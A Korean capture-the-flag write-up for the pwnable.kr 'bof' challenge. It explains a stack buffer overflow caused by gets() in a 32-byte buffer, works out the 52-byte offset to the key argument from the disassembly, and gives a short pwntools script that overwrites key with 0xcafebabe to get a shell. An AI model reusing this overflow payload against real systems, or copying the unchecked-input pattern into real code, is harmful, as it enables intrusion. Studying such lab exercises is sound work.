![](Attachments/789FE7B2-FC75-46E0-ADCA-D5BEF6ED126F.png)


### Buffer Overflow
- 스택 버퍼 오버플로우
- 힙 버퍼 오버플로우



우분투에서 wget을 통해 파일을 다운받는다.
`$ wget http://pwnable.kr/bin/bof`

`http://pwnable.kr/bin/bof.c`

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];    // 32바이트 크기의 배열
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```
- 0xdeadbeef를 key로 함수에 전달하고, key가 0xcafebabe와 일치하면 셸을 실행함
- `gets`함수로 사용자 입력을 받아 배열 `overflowme`에 저장함
	- `gets`는 입력 길이를 검증하지 않으므로, 입력이 32바이트를 초과하면 메모리의 다른 영역을 덮어쓸 수 있음
	- 이를 통해 key 변수의 값을 변경할 수 있음


#### 풀이

key 값을 원하는 값으로 바꿔주기 위해서는 입력이 가능한 overflowme와 key 변수 간의 거리를 알아야 한다.

![](Attachments/986F88B2-A8F9-4AEB-99F2-D7655936CDB3.png)

- func 함수의 disassembly 코드를 보면 4번의 call이 있는데, 각각 printf(), gets(), system(), printf()를 의미한다.
	- gets의 인자로 overflowme가 들어가고, 두 번째 call 위의 lea에서 [ebp-0x2c]의 주소를 인자로 받을 수 있게 하므로 overflowme는 [ebp-0x2c]에 있다.
	- key는 0xcafebabe와 비교하기 때문에, func+40에서 [ebp+0x8] 위치에 있다.
		- breakpoint를 걸고 실행시키면 overflowme 값을 받는 것이 보인다.![](Attachments/1E6568B2-7D36-41A3-AA30-0B1B2D286B8E.png)

key인 [ebp+0x8]과 overflowme [ebp-0x2c]의 거리는 52바이트이다.

```python
#!/usr/bin/env python
from pwn import *
#context.log_level = 'debug'

conn = remote('pwnable.kr', 9000)
conn.sendline('A'*52+'\xbe\xba\xfe\xca')
conn.interactive()
```

`$ python3 bofPwn.py`

![](Attachments/95374845-63C2-4195-9B44-D6359AC901E0.png)